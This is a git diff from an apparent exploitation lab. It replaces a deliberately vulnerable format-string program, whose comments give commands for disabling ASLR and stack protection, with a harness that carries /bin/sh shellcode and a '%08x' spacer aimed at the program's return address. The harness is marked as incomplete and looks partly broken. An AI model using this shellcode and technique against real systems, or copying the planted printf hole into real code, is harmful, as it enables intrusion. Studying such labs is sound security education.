ab899ebd0fb8c844326247eceec4694d74a9d82f
Sagar Wani <ssswanil@gmail.com>
2017-10-14 03:05:27 -0700

    Update tester.c

--- formatstring/tester.c
+++ formatstring/tester.c
@@ -1,6 +1,11 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
+/*
+ * formatstringtester.c
+ *
+ *  Created on: Sep 21, 2016
+ *      Author: Reuben Johnston
+ */
+
+int real_main(int argc, char *argv[]);
 
 typedef int bool;
 #define true 1
@@ -8,94 +13,110 @@ typedef int bool;
 
 #define DEBUG 1
 #define FORMATBUFFERSIZE 2048
-#define main real_main //Only define this when we're overloading via formatstringtester.c (i.e., comment out for normal build)
 
-// From the linux sprintf man page:
-// %n-The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.
+union
+{
+    unsigned long int integer;
+    unsigned char byte[4];
+} intUnion;
 
-// To build:
-// $ gcc -g -m32 -Wno-format-security -fno-stack-protector -z execstack formatstringtester.c -o formatstringtester
-//
-// To build in Eclipse:
-//   cross gcc compiler miscellaneous settings: -m32 -Wno-format-security -fno-stack-protector
-//   cross gcc linker miscellaneous settings: -m32 -z execstack
-// Debugger useful settings for prompting default arguments: ${string_prompt:My Prompt Text:Default Value}
-//
-// Before running, disable ASLR: $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-// You can turn ASLR back on using: $ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
-//
-// If you need to pass script output as a program argument, don't run in eclipse (unless you're smarter than me)
-// $ ddd --args Debug/stacksmash $(../shellcode/inputargs)
-//
-// See the shellcode example project for shellcode that works
-//
-// To run in Eclipse:
-//   Run it in the debugger and pass in shellcode address=ffffb5e0, ret fptr address=ffffb9ec as the arguments (if it doesn't work, see what the address of buf
-//     printed out in vuln() is and pass in that value instead)
-// To run from shell:
-//   The procedure is the similar to above but passes in shellcode address=ffffb5e0, ret fptr address=ffffb9ec as the arguments (if this doesn't work, see above)
+union
+{
+    unsigned short int shortinteger;
+    unsigned char byte[2];
+} shortUnion;
 
-#define usagefile "./usagedetails.txt"
+//char shellcode[] = "AAAAAAAAAAAAAAAAAAAAAAAAA";
 
-// This function provides a remote capability to update the file used as input to the function that provides program usage and instruction details to users.
-int updateUsageFile(const char *filename, const char *buffer) {
-    int status=0;
-    FILE *fp;
-    fp=fopen(filename, "w+" );
-    printf("\nThe length of buffer is: %d\n", strlen(buffer));
-    fwrite(buffer, 1, strlen(buffer), fp);
-    fclose(fp);
-    return(status);
-}
-
-// To facilitate remote updates for program usage and instruction details without recompiling code, a clever developer moved the usage details to a file.
-// The file can be updated using the updateUsageFile() function above
-int printFormattedUsageFile(const char *filename) {//0xbfffe448 = EBP
-    char rawbuf[FORMATBUFFERSIZE] __attribute__ ((aligned (8)));//our shellcode is 25 bytes;
-    char printbuf[FORMATBUFFERSIZE] __attribute__ ((aligned (8)));//our shellcode is 25 bytes;
-    int status=0;
-    int len=0;
-    FILE *fp;
-#if DEBUG
-    register int sp asm ("sp");
-    register int ebp asm ("ebp");
-    printf("sp=%x, ebp=%x, printbuf(shellcodeaddr)=%x, retaddr=%x, *retaddr=%x\n", sp, ebp, printbuf, (unsigned long *)(ebp+4), *(unsigned long *)(ebp+4));
-    printf("opening %s",filename);
-#endif
-    fp=fopen(filename, "r" );/*open the file*/
-    fseek(fp, 0L, SEEK_END);/*peek the file size by setting the pointer to the file's end*/
-    len = ftell(fp);/*save the file size*/
-    fseek(fp, 0L, SEEK_SET);/*reset the file pointer*/
-    fread(rawbuf, 1, len, fp);/*read the file*/
-#if DEBUG
-    printf("%s\n",rawbuf);/*print the final version*/
-#endif
-    memset(printbuf,0,sizeof(printbuf));/*clear the printbuf*/
-    snprintf(printbuf, len+1, "%s\n", rawbuf);/*formatted print into the printbuf, add 1 to filesize for '\n'*/
-    printf(printbuf);/*print the final version*/ /*NOTE: retfptr is smashed here*/
-#if DEBUG
-    printf("sp=%x, ebp=%x, printbuf(shellcodeaddr)=%x, retaddr=%x, *retaddr=%x\n", sp, ebp, printbuf, (unsigned long *)(ebp+4), *(unsigned long *)(ebp+4));
-#endif
-    return(status);
-}
+char shellcode[] = \
+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80\x90";//this shellcode has x3 NOPs for padding, length=28
+//0x804a050
+char spacer[] = \
+"%08x.%08x.%08x.%08x.%08x.%08x.";//This spacer was altered from what is present in the complete version of the exploit
+//char spacer[] = "\x90\x90\x90\x90\x90\x90";
 
 int main(int argc, char *argv[]) {
+    int ret = 0;
+    char taintedbuf[2048] __attribute__ ((aligned (8)));
+    char tempstr[512];
+    char formatstr[512];
+    unsigned long int shellcodeaddr, retfptraddr;
+    short int pad1, pad2, pad3, pad4;
+    int shellcodesize, spacersize, shellcodecnt, spacercnt;
+    int taintedbufWritePtr, taintedbufWriteCnt;
 
-    int status=0;
-
-    if (argc!=2) {
-        printf("Usage: ./formatstring <newbuffer>\n");
-        return(-1);
+    if (argc == 3) {
+        sscanf(argv[1],"%lx",&shellcodeaddr);
+        sscanf(argv[2],"%lx",&retfptraddr);
     }
-#if DEBUG
     else {
-        printf("argv[0](formatstring)=%s\n",argv[0]);//This binary's name
-        printf("argv[1](<newbuffer>)=%s\n",argv[1]);//<newbuffer> to write to usagefile
+        //To prompt user for program arguments in eclipse, use ${string_prompt:shellcodeaddr:0xffffac40} ${string_prompt:retfptraddr:0xffffbc5c}
+        printf("warning, incorrect args.  need to enter argv[1]=shellcodeaddr and argv[2]=retfptraddr\n");
+        return (-1);
     }
-#endif
+    printf("shellcodeaddr=0x%lx, retfptraddr=0x%lx\n",shellcodeaddr, retfptraddr);
+    memset(taintedbuf,0,sizeof(taintedbuf));//clear the buffer
+    //Construction of the tainted buffer has been omitted
 
-    updateUsageFile(usagefile, argv[1]);
-    printFormattedUsageFile(usagefile);
+    int i=0;
+    int s=0;
+    int f=0;
+    int x=0;
+/*
+    for(;x<100;++x)
+    {
+    for(;f<sizeof(spacer)/sizeof(char);++f)
+        {
+        	taintedbuf[i]=spacer[f];
+        	++i;
+        }
+    	f=0;
+    }
 
-    return(0);
+    for(;s<sizeof(shellcode)/sizeof(char);++s)
+    {
+    	taintedbuf[i]=shellcode[s];
+    	++i;
+    }
+*/
+    //taintedbuf[i]="\x20";
+    //i = i + 1;
+
+/*
+    for(;x<2080;++x)
+       {
+           	taintedbuf[x]="A";
+       }
+*/
+    printf("\nThe length of spacer buffer is: %d\n", strlen(spacer));
+
+    for(i=0;i<strlen(shellcode);i++)
+    {
+    	taintedbuf[i] = shellcode[x];
+    	x++;
+    }
+
+
+
+    for(s=0; s<68; s++)
+    {
+    	for(f=0;f<30;f++)
+    	{
+
+    		taintedbuf[i++] = spacer[f];
+
+    	}
+
+    }
+    printf("The value of i now is: %d", i);
+    printf("\nThe length of tainted buffer is: %d\n", strlen(taintedbuf));
+    argc=2;//real_main's argc should only be 2
+    argv[1]=taintedbuf;//real_main's argv[1] is the buffer to be written to usagefile
+    printf("\n");
+    printf(argv[1]);
+    printf("\n\n");
+    printf("\nThe length of argv[1] is: %d\n", strlen(argv[1]));
+    ret = real_main(argc, argv);
+
+    return (ret);
 }
